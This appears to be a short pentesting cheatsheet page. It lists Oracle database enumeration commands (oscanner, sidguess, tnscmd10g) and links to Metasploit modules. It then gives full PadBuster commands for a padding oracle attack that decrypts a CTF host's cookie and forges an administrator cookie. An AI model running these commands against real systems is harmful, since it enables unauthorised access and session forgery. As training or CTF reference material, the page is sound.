# Oracle

All tools used below are supported by  [[Kali]], `nmap` has default scripts for Oracle Services  [[Nmap-Cheatsheet]] and [[Nmap-AllTheScripts]]; 
```bash
# oscanner
oscanner -s $ip -P 1040

# sidguess
sidguess -i $ip -d /usr/share/wordlists/metasploit/unix_users.txt

# tnscmd10g
tnscmd10g version -h $ip
```

[[Metasploit]] has Auxiliary Modules:
- https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/admin/oracle


## [Padding oracle attacks](https://github.com/ChrisPritchard/ctf-writeups/blob/master/TIPS-AND-TRICKS.md#padding-oracle-attacks)

This is a updated mirror of [ChrisPritchard/ctf-writeups/ TIPS-AND-TRICKS.md#Padding oracle attacks](https://github.com/ChrisPritchard/ctf-writeups/blob/master/TIPS-AND-TRICKS.md#padding-oracle-attacks)

Use [https://github.com/AonCyberLabs/PadBuster](https://github.com/AonCyberLabs/PadBuster) might need to install: 
`sudo apt-get install libcrypt-ssleay-perl`

Command to decrypt some cookie value:
```bash
./padBuster.pl http://10.10.31.123/index.php TaIt46TG994JDsPmpFp8Q0XovkIFJHY4 8 -cookies hcon=TaIt46TG994JDsPmpFp8Q0XovkIFJHY4 -error "Invalid padding"`
```
If that works, and the cookie value is something you want to manipulate, you can use the same tool to encrypt via the -plaintext argument:

```bash
./padBuster.pl http://10.10.31.123/index.php TaIt46TG994JDsPmpFp8Q0XovkIFJHY4 8 -cookies hcon=TaIt46TG994JDsPmpFp8Q0XovkIFJHY4 -error "Invalid padding" -plaintext user=administratorhc0nwithyhackme`
```

## References

[OlivierLaflamme/Cheatsheet-God - Cheatsheet_Oracle.txt](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_Oracle.txt)
[rapid7 GitHub - Oracle Auxiliary Modules](https://github.com/rapid7/metasploit-framework/tree/master/modules/auxiliary/admin/oracle)
[ChrisPritchard/ctf-writeups/ TIPS-AND-TRICKS.md#Padding oracle attacks](https://github.com/ChrisPritchard/ctf-writeups/blob/master/TIPS-AND-TRICKS.md#padding-oracle-attacks)
